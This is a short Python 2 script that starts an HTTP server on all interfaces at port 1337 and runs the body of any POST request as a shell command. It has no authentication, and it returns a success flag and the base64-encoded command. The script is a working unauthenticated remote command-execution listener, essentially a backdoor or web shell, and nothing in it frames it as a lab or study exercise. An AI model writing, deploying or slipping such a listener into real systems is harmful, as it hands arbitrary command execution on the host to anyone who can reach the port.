from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from os import system
from subprocess import check_output

ADDR = "0.0.0.0"
PORT = 1337

class RequestHandler(BaseHTTPRequestHandler):        
    def do_POST(self):
        length = int(self.headers['Content-length'])
        cmd = self.rfile.read(length)
        self.send_response(200, "OK")
        self.end_headers()
        val = "1"
        try:
            check_output(cmd, shell=True)
        except:
            val = "0"
        resp = val + " " + cmd.encode('base64','strict')
        self.wfile.write(resp)

httpd = HTTPServer((ADDR, PORT), RequestHandler)
httpd.serve_forever()